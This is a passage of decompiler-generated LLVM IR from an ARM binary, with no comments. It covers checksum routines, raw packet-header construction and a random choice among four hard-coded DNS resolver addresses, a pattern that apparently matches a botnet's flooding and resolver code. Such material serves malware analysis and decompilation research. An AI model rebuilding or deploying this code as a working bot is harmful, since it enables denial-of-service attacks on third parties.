  store i32 65535, i32* @r5, align 4
  store i1 %v3_c6ac, i1* %cpsr_z.global-to-local, align 1
  %v1_c6b0 = add i32 %v7_c6a4, 20
  store i32 %v1_c6b0, i32* @r6, align 4
  br i1 %v3_c6ac, label %dec_label_pc_c788, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c698
  store i32 %v3_c458, i32* @lr, align 4
  store i1 %v3_c6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6bc, label %dec_label_pc_c79c, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c788.dec_label_pc_c6c4_crit_edge, %dec_label_pc_c6b8
  %v1_c6c8 = phi i32 [ %v1_c6c8.pre, %dec_label_pc_c788.dec_label_pc_c6c4_crit_edge ], [ 65535, %dec_label_pc_c6b8 ]
  store i32 %v3_c474, i32* %r0.global-to-local, align 4
  %v9_c6c8 = icmp eq i32 %v3_c474, %v1_c6c8
  store i1 %v9_c6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6c8, label %dec_label_pc_c7b0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c79c, %dec_label_pc_c6c4
  %v1_c6d4 = phi i32 [ %v1_c7a8, %dec_label_pc_c79c ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  store i32 %v3_c47c, i32* %r2.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v3_c47c, %v1_c6d4
  store i1 %v9_c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6d4, label %dec_label_pc_c7c4, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c7b0, %dec_label_pc_c6d0, %dec_label_pc_c7c4
  %v0_c6dc = load i32, i32* @r4, align 4
  %v1_c6dc = add i32 %v0_c6dc, 41
  store i32 %v1_c6dc, i32* %r0.global-to-local, align 4
  store i32 %v4_c6e0.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c6e4 = call i32 @function_e178(i32 %v1_c6dc, i32 %v4_c6e0.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6ec = load i32, i32* @r4, align 4
  %v3_c6ec = add i32 %v2_c6ec, 10
  %v4_c6ec = inttoptr i32 %v3_c6ec to i16*
  store i16 0, i16* %v4_c6ec, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c6f4 = load i32, i32* @r4, align 4
  store i32 %v0_c6f4, i32* @r0, align 4
  %v2_c6f8 = call i32 @function_c848(i32 %v0_c6f4, i32 20)
  %v3_c6f8 = trunc i32 %v2_c6f8 to i16
  store i32 %v2_c6f8, i32* %r0.global-to-local, align 4
  %v3_c6fc = load i32, i32* @r4, align 4
  %v4_c6fc = add i32 %v3_c6fc, 10
  %v5_c6fc = inttoptr i32 %v4_c6fc to i16*
  store i16 %v3_c6f8, i16* %v5_c6fc, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c704 = load i32, i32* @r6, align 4
  %v3_c704 = add i32 %v2_c704, 6
  %v4_c704 = inttoptr i32 %v3_c704 to i16*
  store i16 0, i16* %v4_c704, align 2
  %v0_c708 = load i32, i32* @r6, align 4
  store i32 %v0_c708, i32* @r1, align 4
  %v1_c70c = add i32 %v0_c708, 4
  %v2_c70c = inttoptr i32 %v1_c70c to i16*
  %v3_c70c = load i16, i16* %v2_c70c, align 2
  %v4_c70c = zext i16 %v3_c70c to i32
  store i32 %v4_c70c, i32* %r2.global-to-local, align 4
  %v0_c710 = load i32, i32* @sb, align 4
  store i32 %v0_c710, i32* %r3.global-to-local, align 4
  %v0_c714 = load i32, i32* @r4, align 4
  store i32 %v0_c714, i32* %r0.global-to-local, align 4
  %v4_c718 = call i32 @function_c898(i32 %v0_c714, i32 %v0_c708, i32 %v4_c70c, i32 %v0_c710)
  %v5_c718 = trunc i32 %v4_c718 to i16
  store i32 %v4_c718, i32* %r0.global-to-local, align 4
  %v3_c71c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c71c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c724 = mul i32 %v3_c71c, 32
  store i32 %v3_c724, i32* %ip.global-to-local, align 4
  %v3_c728 = load i32, i32* @r6, align 4
  %v4_c728 = add i32 %v3_c728, 6
  %v5_c728 = inttoptr i32 %v4_c728 to i16*
  store i16 %v5_c718, i16* %v5_c728, align 2
  %v0_c72c = load i32, i32* %ip.global-to-local, align 4
  %v1_c72c = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_c72c, -8
  %v5_c72c = add i32 %v0_c72c, %tmp128
  store i32 %v5_c72c, i32* %ip.global-to-local, align 4
  %v0_c730 = load i32, i32* @r6, align 4
  %v1_c730 = add i32 %v0_c730, 2
  %v2_c730 = inttoptr i32 %v1_c730 to i16*
  %v3_c730 = load i16, i16* %v2_c730, align 2
  %v1_c734 = load i32, i32* @lr, align 4
  %v2_c734 = add i32 %v1_c734, %v5_c72c
  store i32 %v2_c734, i32* %ip.global-to-local, align 4
  %v3_c738 = add i32 %v2_c734, 2
  %v4_c738 = inttoptr i32 %v3_c738 to i16*
  store i16 %v3_c730, i16* %v4_c738, align 2
  %v0_c73c = load i32, i32* @fp, align 4
  %v1_c73c = load i32, i32* %ip.global-to-local, align 4
  %v2_c73c = add i32 %v1_c73c, 4
  %v3_c73c = inttoptr i32 %v2_c73c to i32*
  store i32 %v0_c73c, i32* %v3_c73c, align 4
  %v0_c740 = load i32, i32* @r4, align 4
  store i32 %v0_c740, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v0_c74c = load i32, i32* @sl, align 4
  store i32 %v0_c74c, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c754 = load i32, i32* %ip.global-to-local, align 4
  %v6_c75c = call i32 @function_11560(i32 %v3_c3f4, i32 %v0_c740, i32 %v0_c74c, i32 16384, i32 %v0_c754, i32 16)
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  %v1_c764 = add i32 %v3_c760, 1
  store i32 %v1_c764, i32* %r0.global-to-local, align 4
  %v0_c768 = load i32, i32* @r8, align 4
  %v9_c768 = icmp eq i32 %v0_c768, %v1_c764
  store i1 %v9_c768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c764, i32* %stack_var_-44, align 4
  %v8_c770 = icmp sgt i32 %v0_c768, %v1_c764
  br i1 %v8_c770, label %dec_label_pc_c698, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c6dc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c778 = icmp eq i32 %v0_c768, 0
  store i1 %v2_c778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c778, label %dec_label_pc_c67c, label %dec_label_pc_c68c

dec_label_pc_c788:                                ; preds = %dec_label_pc_c698
  %v0_c788 = call i32 @function_e0b4()
  %v1_c788 = trunc i32 %v0_c788 to i16
  store i32 %v0_c788, i32* %r0.global-to-local, align 4
  store i32 %v3_c458, i32* @lr, align 4
  %v1_c790 = load i32, i32* @r5, align 4
  %v9_c790 = icmp eq i32 %v3_c458, %v1_c790
  store i1 %v9_c790, i1* %cpsr_z.global-to-local, align 1
  %v3_c794 = load i32, i32* @r4, align 4
  %v4_c794 = add i32 %v3_c794, 4
  %v5_c794 = inttoptr i32 %v4_c794 to i16*
  store i16 %v1_c788, i16* %v5_c794, align 2
  br i1 %v9_c790, label %dec_label_pc_c79c, label %dec_label_pc_c788.dec_label_pc_c6c4_crit_edge

dec_label_pc_c788.dec_label_pc_c6c4_crit_edge:    ; preds = %dec_label_pc_c788
  %v1_c6c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c6c4

dec_label_pc_c79c:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c6b8
  %v0_c79c = call i32 @function_e0b4()
  %v1_c79c = trunc i32 %v0_c79c to i16
  %v3_c7a0 = load i32, i32* @r4, align 4
  %v4_c7a0 = add i32 %v3_c7a0, 20
  %v5_c7a0 = inttoptr i32 %v4_c7a0 to i16*
  store i16 %v1_c79c, i16* %v5_c7a0, align 2
  store i32 %v3_c474, i32* %r0.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r5, align 4
  %v9_c7a8 = icmp eq i32 %v3_c474, %v1_c7a8
  store i1 %v9_c7a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7a8, label %dec_label_pc_c7b0, label %dec_label_pc_c6d0

dec_label_pc_c7b0:                                ; preds = %dec_label_pc_c79c, %dec_label_pc_c6c4
  %v0_c7b0 = call i32 @function_e0b4()
  %v1_c7b0 = trunc i32 %v0_c7b0 to i16
  store i32 %v0_c7b0, i32* %r0.global-to-local, align 4
  store i32 %v3_c47c, i32* %r2.global-to-local, align 4
  %v1_c7b8 = load i32, i32* @r5, align 4
  %v9_c7b8 = icmp eq i32 %v3_c47c, %v1_c7b8
  store i1 %v9_c7b8, i1* %cpsr_z.global-to-local, align 1
  %v3_c7bc = load i32, i32* @r6, align 4
  %v4_c7bc = add i32 %v3_c7bc, 2
  %v5_c7bc = inttoptr i32 %v4_c7bc to i16*
  store i16 %v1_c7b0, i16* %v5_c7bc, align 2
  br i1 %v9_c7b8, label %dec_label_pc_c7c4, label %dec_label_pc_c6dc

dec_label_pc_c7c4:                                ; preds = %dec_label_pc_c7b0, %dec_label_pc_c6d0
  %v0_c7c4 = call i32 @function_e0b4()
  %v1_c7c4 = trunc i32 %v0_c7c4 to i16
  store i32 %v0_c7c4, i32* %r0.global-to-local, align 4
  %v3_c7c8 = load i32, i32* @r4, align 4
  %v4_c7c8 = add i32 %v3_c7c8, 28
  %v5_c7c8 = inttoptr i32 %v4_c7c8 to i16*
  store i16 %v1_c7c4, i16* %v5_c7c8, align 2
  br label %dec_label_pc_c6dc

dec_label_pc_c7d0:                                ; preds = %dec_label_pc_c35c, %dec_label_pc_c33c, %dec_label_pc_c2e0, %dec_label_pc_c18c
  %v0_c7d0 = call i32 @function_e0b4()
  %v1_c7d4 = urem i32 %v0_c7d0, 4
  store i32 %v1_c7d4, i32* %r0.global-to-local, align 4
  %v2_c7d8 = icmp eq i32 %v1_c7d4, 3
  store i1 %v2_c7d8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c7d0 to i2
  switch i2 %trunc, label %dec_label_pc_c3d49 [
    i2 0, label %dec_label_pc_c80c
    i2 1, label %dec_label_pc_c838
    i2 -2, label %dec_label_pc_c82c
    i2 -1, label %dec_label_pc_c81c
  ]

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c404
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v1_c7f8 = call i32 @function_10dd8(i32 %v3_c3f4)
  store i32 %v1_c7f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c7fc

dec_label_pc_c7fc:                                ; preds = %dec_label_pc_c3dc, %dec_label_pc_c3d4, %dec_label_pc_c7f4
  %v1_c808 = phi i32 [ %v3_c3f4, %dec_label_pc_c3dc ], [ %v1_c80849, %dec_label_pc_c3d4 ], [ %v1_c7f8, %dec_label_pc_c7f4 ]
  store i32 %v18_c18c, i32* %sb.global-to-local, align 4
  store i32 %v27_c18c, i32* %lr.global-to-local, align 4
  ret i32 %v1_c808

dec_label_pc_c80c:                                ; preds = %dec_label_pc_c7d0
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c3d4

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c7d0
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c3d4

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c7d0
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c3d4

dec_label_pc_c838:                                ; preds = %dec_label_pc_c7d0
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c3d4

; uselistorder directives
  uselistorder i32 %v1_c7d4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c7d0, { 1, 0 }
  uselistorder i32 %v0_c7c4, { 1, 0 }
  uselistorder i32 %v0_c7b0, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 1, 0 }
  uselistorder i32 %v0_c788, { 1, 0 }
  uselistorder i32 %v1_c764, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c72c, { 1, 0 }
  uselistorder i32 %v4_c718, { 1, 0 }
  uselistorder i32 %v2_c6f8, { 1, 0 }
  uselistorder i1 %v3_c6bc, { 1, 0 }
  uselistorder i1 %v3_c6ac, { 1, 0 }
  uselistorder i32 %v4_c6e0.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c654, { 1, 0, 2 }
  uselistorder i32 %v0_c644, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c630, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c62c, { 1, 0, 2 }
  uselistorder i32 %v0_c59c, { 1, 0 }
  uselistorder i32 %v4_c598, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v3_c4a0, { 1, 0 }
  uselistorder i32 %v1_c494, { 2, 0, 1 }
  uselistorder i32 %v3_c460, { 1, 0 }
  uselistorder i32 %v3_c458, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_c450, { 0, 2, 1 }
  uselistorder i8 %v5_c448, { 1, 0, 2 }
  uselistorder i32 %v1_c434, { 1, 0 }
  uselistorder i32 %v0_c434, { 1, 0 }
  uselistorder i1 %v7_c424, { 1, 0 }
  uselistorder i1 %v7_c3f8, { 1, 0 }
  uselistorder i32 %v3_c3f4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c3d4, { 1, 0, 2 }
  uselistorder i32 %v2_c3a4, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3a0, { 1, 0, 2 }
  uselistorder i1 %v7_c390, { 1, 0 }
  uselistorder i32 %v1_c38c, { 1, 0, 2 }
  uselistorder i1 %v8_c384, { 1, 0 }
  uselistorder i1 %v7_c380, { 1, 0 }
  uselistorder i32 %v1_c374, { 1, 0 }
  uselistorder i8 %v2_c368, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c36c, { 1, 0 }
  uselistorder i32 %v0_c38c, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c35c, { 0, 2, 1 }
  uselistorder i32 %v1_c370, { 0, 2, 1 }
  uselistorder i32 %v2_c344, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c33c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c334, { 1, 0 }
  uselistorder i32 %v0_c334, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_c2d8, { 1, 0, 3, 2 }
  uselistorder i32 %v6_c278, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c25c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c244, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c22c, { 1, 2, 0 }
  uselistorder i32 %v5_c220, { 0, 2, 1 }
  uselistorder i32 %v7_c1e8, { 1, 0, 2, 3 }
  uselistorder i32 %v5_c1e8, { 0, 2, 1 }
  uselistorder i32 %v2_c1ac, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 37, 36, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 19, 17, 18, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 43, 42, 44, 58, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c7fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c68c, { 1, 0 }
  uselistorder label %dec_label_pc_c67c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c67c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c64c, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 1, 0 }
  uselistorder label %dec_label_pc_c390, { 1, 0 }
  uselistorder label %dec_label_pc_c35c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c354, { 1, 0 }
}

define i32 @function_c848(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c848:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c86c, label %dec_label_pc_c854

dec_label_pc_c854:                                ; preds = %dec_label_pc_c848
  %v0_c85c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c858

dec_label_pc_c858:                                ; preds = %dec_label_pc_c858, %dec_label_pc_c854
  %v0_c864 = phi i32 [ %v2_c864, %dec_label_pc_c858 ], [ 0, %dec_label_pc_c854 ]
  %v0_c85c = phi i32 [ %v5_c85c, %dec_label_pc_c858 ], [ %v0_c85c.pre, %dec_label_pc_c854 ]
  %v0_c858 = phi i32 [ %v1_c858, %dec_label_pc_c858 ], [ %arg1, %dec_label_pc_c854 ]
  %v1_c858 = add i32 %v0_c858, -2
  %v1_c85c = inttoptr i32 %v0_c85c to i16*
  %v2_c85c = load i16, i16* %v1_c85c, align 2
  %v3_c85c = zext i16 %v2_c85c to i32
  %v5_c85c = add i32 %v0_c85c, -2
  store i32 %v5_c85c, i32* @r0, align 4
  %v2_c864 = add i32 %v3_c85c, %v0_c864
  %v1_c858.cmp = icmp ugt i32 %v1_c858, 1
  br i1 %v1_c858.cmp, label %dec_label_pc_c858, label %dec_label_pc_c86c.loopexit

dec_label_pc_c86c.loopexit:                       ; preds = %dec_label_pc_c858
  br label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c848, %dec_label_pc_c86c.loopexit
  %v1_c874 = phi i32 [ %v2_c864, %dec_label_pc_c86c.loopexit ], [ 0, %dec_label_pc_c848 ]
  %v0_c86c = phi i32 [ %v1_c858, %dec_label_pc_c86c.loopexit ], [ %arg1, %dec_label_pc_c848 ]
  %v7_c86c = icmp eq i32 %v0_c86c, 1
  br i1 %v7_c86c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c86c
  %v1_c870 = load i32, i32* @r0, align 4
  %v2_c870 = inttoptr i32 %v1_c870 to i8*
  %v3_c870 = load i8, i8* %v2_c870, align 1
  %v4_c870 = zext i8 %v3_c870 to i32
  %v3_c874 = add i32 %v1_c874, %v4_c870
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c86c, %bb
  %v0_c878 = phi i32 [ %v1_c874, %dec_label_pc_c86c ], [ %v3_c874, %bb ]
  %v3_c87c = urem i32 %v0_c878, 65536
  %v4_c880 = udiv i32 %v0_c878, 65536
  %v5_c880 = add nuw nsw i32 %v4_c880, %v3_c87c
  %v4_c884 = udiv i32 %v5_c880, 65536
  %v5_c884 = add nuw nsw i32 %v4_c884, %v5_c880
  %v1_c888 = urem i32 %v5_c884, 65536
  %v3_c890 = xor i32 %v1_c888, 65535
  ret i32 %v3_c890

; uselistorder directives
  uselistorder i32 %v5_c880, { 1, 0 }
  uselistorder i32 %v5_c85c, { 1, 0 }
  uselistorder i32 %v1_c858, { 1, 0, 2 }
  uselistorder i32 %v0_c85c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c86c, { 1, 0 }
}

define i32 @function_c898(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c898:
  %v1_c8a8 = add i32 %arg1, 12
  %v2_c8a8 = inttoptr i32 %v1_c8a8 to i32*
  %v3_c8a8 = load i32, i32* %v2_c8a8, align 4
  %v1_c8ac = add i32 %arg1, 16
  %v2_c8ac = inttoptr i32 %v1_c8ac to i32*
  %v3_c8ac = load i32, i32* %v2_c8ac, align 4
  %v7_c8b0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8b0, label %dec_label_pc_c8bc.preheader, label %dec_label_pc_c8d0

dec_label_pc_c8bc.preheader:                      ; preds = %dec_label_pc_c898
  %v0_c8c0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8bc

dec_label_pc_c8bc:                                ; preds = %dec_label_pc_c8bc.preheader, %dec_label_pc_c8bc
  %v0_c8c8 = phi i32 [ 0, %dec_label_pc_c8bc.preheader ], [ %v2_c8c8, %dec_label_pc_c8bc ]
  %v0_c8c0 = phi i32 [ %v0_c8c0.pre, %dec_label_pc_c8bc.preheader ], [ %v5_c8c0, %dec_label_pc_c8bc ]
  %v0_c8bc = phi i32 [ %arg3, %dec_label_pc_c8bc.preheader ], [ %v1_c8bc, %dec_label_pc_c8bc ]
  %v1_c8bc = add nsw i32 %v0_c8bc, -2
  %v1_c8c0 = inttoptr i32 %v0_c8c0 to i16*
  %v2_c8c0 = load i16, i16* %v1_c8c0, align 2
  %v3_c8c0 = zext i16 %v2_c8c0 to i32
  %v5_c8c0 = add i32 %v0_c8c0, -2
  store i32 %v5_c8c0, i32* @r1, align 4
  %v2_c8c8 = add i32 %v3_c8c0, %v0_c8c8
  %v8_c8cc = icmp sgt i32 %v1_c8bc, 1
  br i1 %v8_c8cc, label %dec_label_pc_c8bc, label %dec_label_pc_c8d0.loopexit

dec_label_pc_c8d0.loopexit:                       ; preds = %dec_label_pc_c8bc
  br label %dec_label_pc_c8d0

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c8d0.loopexit, %dec_label_pc_c898
  %v1_c8dc = phi i32 [ %v2_c8c8, %dec_label_pc_c8d0.loopexit ], [ 0, %dec_label_pc_c898 ]
  %v0_c8d0 = phi i32 [ %v1_c8bc, %dec_label_pc_c8d0.loopexit ], [ %arg3, %dec_label_pc_c898 ]
  %v7_c8d0 = icmp eq i32 %v0_c8d0, 1
  br i1 %v7_c8d0, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c8d0
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c8d0
  %v1_c8d4 = load i32, i32* @r1, align 4
  %v2_c8d4 = inttoptr i32 %v1_c8d4 to i8*
  %v3_c8d4 = load i8, i8* %v2_c8d4, align 1
  %v4_c8d4 = zext i8 %v3_c8d4 to i32
  %v3_c8dc = add i32 %v4_c8d4, %v1_c8dc
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c904 = phi i32 [ %v1_c8dc, %.thread ], [ %v3_c8dc, %bb ]
  %v0_c8e4 = mul i32 %v3_c8a8, 65536
  %v3_c8e4 = udiv i32 %v0_c8e4, 65536
  %v3_c8e8 = urem i32 %v3_c8ac, 65536
  %v4_c8f0 = udiv i32 %v3_c8a8, 65536
  %v2_c8ec = add nuw nsw i32 %v3_c8e8, %v4_c8f0
  %v5_c8f0 = add nuw nsw i32 %v2_c8ec, %v3_c8e4
  %v1_c8f4 = add i32 %arg1, 9
  %v2_c8f4 = inttoptr i32 %v1_c8f4 to i8*
  %v3_c8f4 = load i8, i8* %v2_c8f4, align 1
  %v4_c8f4 = zext i8 %v3_c8f4 to i32
  %v4_c8f8 = udiv i32 %v3_c8ac, 65536
  %v3_c900 = mul nuw nsw i32 %v4_c8f4, 256
  %v5_c8f8 = add i32 %v4_c8f8, %arg2
  %v2_c8fc = add i32 %v5_c8f8, %v1_c904
  %v2_c904 = add i32 %v2_c8fc, %v5_c8f0
  %v2_c908 = add i32 %v2_c904, %v3_c900
  %tmp = icmp ult i32 %v2_c908, 65536
  br i1 %tmp, label %dec_label_pc_c928, label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %bb19, %dec_label_pc_c914
  %v2_c91c5 = phi i32 [ %v2_c91c, %dec_label_pc_c914 ], [ %v2_c908, %bb19 ]
  %v3_c9206.in = phi i32 [ %v2_c91c, %dec_label_pc_c914 ], [ %v2_c908, %bb19 ]
  %v3_c9206 = udiv i32 %v3_c9206.in, 65536
  %v3_c918 = urem i32 %v2_c91c5, 65536
  %v2_c91c = add nuw nsw i32 %v3_c918, %v3_c9206
  %tmp20 = icmp ult i32 %v2_c91c, 65536
  br i1 %tmp20, label %dec_label_pc_c928.loopexit, label %dec_label_pc_c914

dec_label_pc_c928.loopexit:                       ; preds = %dec_label_pc_c914
  br label %dec_label_pc_c928

dec_label_pc_c928:                                ; preds = %dec_label_pc_c928.loopexit, %bb19
  %v0_c928 = phi i32 [ %v2_c91c, %dec_label_pc_c928.loopexit ], [ %v2_c908, %bb19 ]
  %v1_c928 = urem i32 %v0_c928, 65536
  %v3_c930 = xor i32 %v1_c928, 65535
  ret i32 %v3_c930

; uselistorder directives
  uselistorder i32 %v2_c91c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c908, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c8dc, { 1, 0 }
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v0_c8c0, { 1, 0 }
  uselistorder i32 %v3_c8a8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8bc, { 1, 0 }
}

define i32 @function_c93c(i32 %arg1) local_unnamed_addr {
dec_label_pc_c93c:
  %v2_c948 = load i32, i32* @global_var_20a54.58, align 4
  %v2_c950 = call i32 @function_10ba4(i32 %v2_c948, i32 9)
  ret i32 %v2_c950
}

define i32 @function_c964(i32 %arg1) local_unnamed_addr {
dec_label_pc_c964:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c964 = load i32, i32* @r4, align 4
  %v6_c964 = load i32, i32* @r5, align 4
  %v9_c964 = load i32, i32* @r6, align 4
  %v12_c964 = load i32, i32* @r7, align 4
  %v15_c964 = load i32, i32* @r8, align 4
  %v18_c964 = load i32, i32* @sb, align 4
  %v21_c964 = load i32, i32* @sl, align 4
  %v24_c964 = load i32, i32* @fp, align 4
  %v27_c964 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c980 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c980, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_c9ac = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9ac, i32* @fp, align 4
  %v3_c9b8 = call i32 @function_11250(i8* nonnull %stack_var_-585, i32 0)
  %v2_c9bc = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c9bc, i32* @sl, align 4
  %v0_c9c0 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_c9cc = bitcast i32* %stack_var_-8777 to i8*
  %v3_c9cc = call i32 @function_11250(i8* %v2_c9cc, i32 %v0_c9c0)
  %v0_c9d4 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_c9e0 = bitcast i32* %stack_var_-4681 to i8*
  %v3_c9e0 = call i32 @function_11250(i8* %v2_c9e0, i32 %v0_c9d4)
  %v2_c9e4 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9e4, i32* @sb, align 4
  %v0_c9e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c9e8 = udiv i32 %v0_c9e8, 256
  %v1_c9ec = urem i32 %v0_c9e8, 256
  store i32 %v1_c9ec, i32* @r4, align 4
  %v3_c9fc = trunc i32 %v3_c9e8 to i8
